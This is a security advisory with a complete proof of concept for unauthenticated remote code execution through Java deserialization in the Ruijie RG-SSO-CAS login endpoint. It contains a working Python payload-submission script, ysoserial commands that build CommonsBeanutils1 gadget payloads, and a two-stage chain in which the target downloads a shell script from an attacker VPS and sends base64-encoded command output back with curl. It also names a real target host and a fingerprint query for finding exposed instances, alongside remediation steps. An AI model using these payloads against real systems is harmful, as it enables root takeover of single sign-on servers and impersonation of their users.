# Ruijie RG-SSO-CAS Unauthenticated Java Deserialization Remote Code Execution

## Vulnerability Summary

| Field | Detail |
|-------|--------|
| **Vendor** | Ruijie Networks (锐捷网络股份有限公司) |
| **Product** | RG-SSO Unified Identity Authentication Platform |
| **Affected Component** | `POST /cas/login` — `execution` parameter |
| **Affected Version** | All versions (observed: `rg-sso-cas-0.0.1-SNAPSHOT`) |
| **Vulnerability Type** | Java Deserialization of Untrusted Data |
| **CWE** | CWE-502 |
| **CVSS v3.1 Score** | **9.8 Critical** |
| **CVSS Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Authentication Required** | No |
| **Discovery Date** | 2026-06-05 |
| **FOFA Exposed Assets** | 275 (`body="login-page-flowkey"`) |

---

## Description

Ruijie Networks' RG-SSO platform is a custom single sign-on solution built on the **Apereo CAS framework**, deployed across universities and enterprises in China. The platform operates in **WebFlow client-side state storage mode**, where the login flow state is serialized, compressed, and embedded directly in the `execution` form parameter.

The vulnerability exists because the server deserializes the `execution` parameter without any **signature or MAC verification**. The parameter format is:

```
execution = <UUID>_<base64(gzip(JavaSerializedObject))>
```

The server invokes `ObjectInputStream.readObject()` on the attacker-controlled data before any authentication check. Combined with the `commons-beanutils` library present in the application classpath, an unauthenticated remote attacker can exploit the **CommonsBeanutils1 gadget chain** to execute arbitrary OS commands with the privileges of the CAS process (observed: `root`).

**Root Cause Analysis:**

1. CAS WebFlow is configured for client-side state storage — the full flow state is serialized and sent to the client in the `execution` parameter
2. No cryptographic signature or HMAC is applied to the serialized data — the server trusts the client-supplied value unconditionally
3. The application bundles `commons-beanutils` in its classpath — the CommonsBeanutils1 ysoserial gadget chain is fully functional
4. Deserialization occurs at the WebFlow state restoration phase, **before** any authentication logic executes

---

## Affected Products

The vulnerability affects all deployments of the Ruijie RG-SSO-CAS platform. The product is identified by the response body containing:

```
login-page-flowkey
```

FOFA query: `body="login-page-flowkey"`

As of 2026-06-05, this query returns **275 results** globally, predominantly Chinese universities and enterprises.

> **Disclosure note:** Vulnerability verification was performed under written authorization from affected institutions. No data was exfiltrated beyond confirmation of code execution (`id` command output).

---

## Proof of Concept

### Prerequisites

- ysoserial (ysoserial-all.jar)
- Java 8 JDK (TemplatesImpl gadget blocked by JPMS in Java 9+)
- Python 3

### Step 1: Identify Vulnerable Endpoint

Send a `GET` request to the CAS login page. A vulnerable instance returns an `execution` parameter containing `login-page-flowkey` with a value prefixed `UUID_H4sI...`:

The `H4sI` prefix represents the base64-encoded gzip magic bytes. Decoding the base64 payload and decompressing with gzip reveals the Java serialization stream magic bytes `AC ED 00 05`, confirming the server processes client-supplied Java objects.

![GET /cas/login — Yakit traffic showing login-page-flowkey element and H4sI-prefixed execution value](screenshots/01_execution_param.png)

The full serialized value is clearly visible in the response body, with `UUID_H4sI...` format indicating no server-side encryption or signing.

![Close-up of the execution parameter value showing H4sI base64 content](screenshots/07_get_flowkey_detail.png)

### Step 2: Validate Deserialization via URLDNS Probe (Harmless)

Generate a URLDNS payload using ysoserial:

```bash
java -jar ysoserial-all.jar URLDNS "http://<dnslog-domain>" > urldns.bin
```

Encode and submit:

```python
import gzip, base64, re, ssl
import urllib.request, urllib.parse, urllib.error

def make_opener():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(
        urllib.request.ProxyHandler({}),   # bypass local proxy
        urllib.request.HTTPSHandler(context=ctx)
    )

def get_flowkey(opener, url):
    req = urllib.request.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0')
    resp = opener.open(req, timeout=12)
    html = resp.read(8192).decode('utf-8', errors='ignore')
    m = re.search(r'login-page-flowkey[^>]*>([^<]+)<', html)
    if not m or '_H4sI' not in m.group(1):
        return None, ''
    val = m.group(1).strip()
    sm  = re.search(r'SESSION=([^;,\s]+)', resp.headers.get('Set-Cookie', ''))
    return val.split('_')[0], (sm.group(1) if sm else '')

TARGET = 'https://<target>/cas/login'
opener = make_opener()
uuid, sess = get_flowkey(opener, TARGET)

with open('urldns.bin', 'rb') as f:
    raw = f.read()

# CRITICAL: must use urlencode — raw base64 contains '+' which breaks manual encoding
execution = uuid + '_' + base64.b64encode(gzip.compress(raw)).decode()
data = urllib.parse.urlencode({'execution': execution}).encode()
req = urllib.request.Request(TARGET, data=data)
req.add_header('Content-Type', 'application/x-www-form-urlencoded')
req.add_header('User-Agent', 'Mozilla/5.0')
if sess:
    req.add_header('Cookie', f'SESSION={sess}')
try:
    opener.open(req, timeout=20)
except:
    pass
```

The DNS log platform receives resolution requests from the target server, confirming that deserialization is triggered server-side before any authentication.

![DNS log platform showing callback records from target server IPs 202.112.23.147 and 210.29.44.50 — deserialization confirmed](screenshots/02_urldns_callback.png)

### Step 3: Generate CommonsBeanutils1 RCE Payload

```bash
# Stage 1: Download shell script from attacker VPS
java -jar ysoserial-all.jar CommonsBeanutils1 \
  "curl http://<VPS>:9090/s.sh -o /tmp/s.sh" > stage1.bin

# Stage 2: Execute the downloaded script
java -jar ysoserial-all.jar CommonsBeanutils1 \
  "/bin/bash /tmp/s.sh" > stage2.bin
```

**Why two stages?**
`Runtime.exec(String)` splits on whitespace only and does not invoke a shell interpreter, so pipe (`|`), redirection (`>`), and command substitution are unavailable in a single payload. The downloaded shell script handles output encoding and exfiltration.

**VPS script (`s.sh`)** — served on port 9090:
```bash
#!/bin/bash
VPS="http://<VPS>:8079"
enc=$(id | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -sk "${VPS}/x/id?d=${enc}" -o /dev/null
```

### Step 4: Stage 1 — Target Downloads the Script

Submit the Stage 1 payload. The target server issues an outbound HTTP GET to the VPS on port 9090 to download `s.sh`.

Both CAS pods (K8s load-balanced deployment) download the script — both egress IPs (`202.119.246.12` and `202.119.246.13`) appear in the VPS access log:

![VPS port 9090 Python HTTP server log — downloads from 202.119.246.13 and 202.119.246.12 confirm Stage 1 execution on both K8s nodes](screenshots/03_stage1_download.png)

> **Load balancer coverage:** Targets often run 2+ CAS pods. Each payload submission is routed to one pod. Submit each stage 2–3 times to cover all nodes. The per-node egress IP appears separately in the callback log, enabling attribution.

### Step 5: Stage 2 — Execute Script, Exfiltrate Output

Submit the Stage 2 payload. The target server executes `/bin/bash /tmp/s.sh`, base64-encodes the `id` output, and sends it to VPS port 8079:

![VPS port 8079 callback log — base64-encoded id output received from 202.119.246.12](screenshots/04_stage2_callback.png)

Extended callback log showing multiple nodes and CBU1HIT confirmation:

![VPS full callback log — multiple id callbacks from .12 and CBU1HIT from .13 confirm full chain execution on both nodes](screenshots/06_vps_full_log.png)

### Step 6: Verify Root-Level Code Execution

Decode the URL-safe base64 callback parameter:

```bash
echo "dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK" | base64 -d
uid=0(root) gid=0(root) groups=0(root)
```

![base64 decode result — uid=0(root) gid=0(root) groups=0(root)](screenshots/05_uid_root.png)

**Unauthenticated remote code execution as root confirmed.**

---

## HTTP Traffic Detail

### GET /cas/login — Retrieving a fresh flowkey

```http
GET /cas/login HTTP/1.1
Host: sfgl.njtech.edu.cn
User-Agent: Mozilla/5.0
Accept-Encoding: identity
Connection: close
```

Response contains the `login-page-flowkey` element with the vulnerable `UUID_H4sI...` execution value (no signing, no encryption):

![Yakit — GET /cas/login request and response, login-page-flowkey value starts with UUID_H4sI](screenshots/01_execution_param.png)

### POST /cas/login — Submitting the malicious payload

```http
POST /cas/login HTTP/1.1
Host: sfgl.njtech.edu.cn
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=86ba795b-a454-4fe3-81af-6092df3aa51b
User-Agent: Mozilla/5.0

execution=77c61d3c-1f7f-4a8d-b35e-8d6a0f1cdd8d_H4sIAAAAAAAAC%2F...
```

Server returns HTTP 500 — deserialization and code execution have already occurred before the response is generated:

![POST /cas/login with encoded CBU1 payload — server returns 500 Internal Server Error (deserialization triggered)](screenshots/08_post_payload_500.png)

> **Implementation note:** The `execution` value **must** be URL-encoded via `urllib.parse.urlencode`. The base64 alphabet includes `+` and `/` which have special meaning in `application/x-www-form-urlencoded` bodies. Using `--data-raw` in curl or manual concatenation without encoding will silently corrupt the payload.

---

## Observed Environment (Authorized Target)

```
Process user:  root
Hostname:      rg-sso-7788f54fb5-6hw7m   (Kubernetes Pod)
OS:            Linux 3.10.0-957.el7.x86_64 (CentOS 7)
JDK:           /jdk/jdk1.8.0_192
Application:   /app/rg-sso-cas-0.0.1-SNAPSHOT.jar
Egress IPs:    202.119.246.12 / 202.119.246.13  (two K8s nodes)
```

The JAR name `rg-sso-cas-0.0.1-SNAPSHOT` uniquely identifies Ruijie's customized CAS distribution and distinguishes this from vanilla Apereo CAS deployments.

---

## Impact

### Direct Impact

- **Unauthenticated Remote Code Execution** as `root` on the CAS server
- Full read/write access to the server filesystem, including database credentials and private keys
- Kubernetes cluster exposure — lateral movement to other pods and services via the internal network

### Indirect Impact

The RG-SSO platform acts as the **central identity provider** for all connected services at affected institutions. Compromise of the CAS server enables:

- Forging of CAS Service Tickets (ST) and Ticket-Granting Tickets (TGT) to impersonate any user across all integrated applications
- Session hijacking across all connected business systems (email, library, academic records, administrative portals)

### Scale

| Sector | Count |
|--------|-------|
| Universities (including 985/211 tier institutions) | 58+ |
| Enterprises and other organizations | 29+ |
| Total exposed assets (FOFA, 2026-06-05) | 275 |

---

## Remediation

### Immediate (P0)

**1. Enable WebFlow server-side encryption** — configure AES+HMAC signing so client-supplied `execution` values are cryptographically verified before deserialization:

```properties
cas.webflow.crypto.signing.key=<256-bit random key>
cas.webflow.crypto.encryption.key=<128-bit random key>
```

CAS 6.4+ enables this by default. Alternatively, switch to server-side session storage to eliminate client-controlled deserialization entirely.

**2. WAF temporary mitigation** — block requests where `execution` contains `H4sI` (the base64-encoded gzip magic bytes indicating unsigned client-side serialization):

```nginx
SecRule ARGS:execution "@contains H4sI" \
  "id:100001,phase:2,deny,status:403,msg:'CAS deserialization attempt blocked'"
```

### Short-term (P1)

3. **Upgrade CAS** to the latest stable release (6.6.x+)
4. **Deploy JVM deserialization filter**:
   ```
   -Djdk.serialFilter=org.apereo.cas.**;!*
   ```
5. **Audit and remove unused high-risk classpath dependencies** — `commons-beanutils`, `commons-collections`, and similar libraries known to support gadget chains

### Defense-in-depth (P2)

6. Run the CAS service as a non-root user: `USER 1000:1000` in the container image
7. Apply Kubernetes `NetworkPolicy` to restrict CAS pod egress — permit only required internal addresses and block arbitrary outbound connections

---

## References

- Apereo CAS WebFlow Cryptography: https://apereo.github.io/cas/6.4.x/webflow/Webflow-Customization-Sessions.html
- ysoserial gadget chain generator: https://github.com/frohoff/ysoserial
- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- FOFA fingerprint query: `body="login-page-flowkey"` (275 results, 2026-06-05)

---

## Timeline

| Date | Event |
|------|-------|
| 2026-06-05 | Vulnerability discovered during authorized penetration testing |
| 2026-06-05 | FOFA asset enumeration — 275 exposed instances identified |
| 2026-06-05 | URLDNS probe confirmed deserialization on multiple targets |
| 2026-06-05 | CommonsBeanutils1 RCE confirmed — `uid=0(root)` obtained on 40+ authorized targets |
| 2026-06-06 | Advisory drafted; vendor notification initiated |
| TBD | Vendor patch released |
| TBD | Full public disclosure |

---

## Researcher

- **Affiliation:** Chongming Security Lab (重明安全实验室), NUIST
- **Certifications:** CISP-PTE, CNVD vulnerability researcher
- **Contact:** xkdztllw61536@hotmail.com

---

*This advisory was prepared for responsible disclosure purposes. All testing was conducted under written authorization from affected institutions. No unauthorized access was performed.*
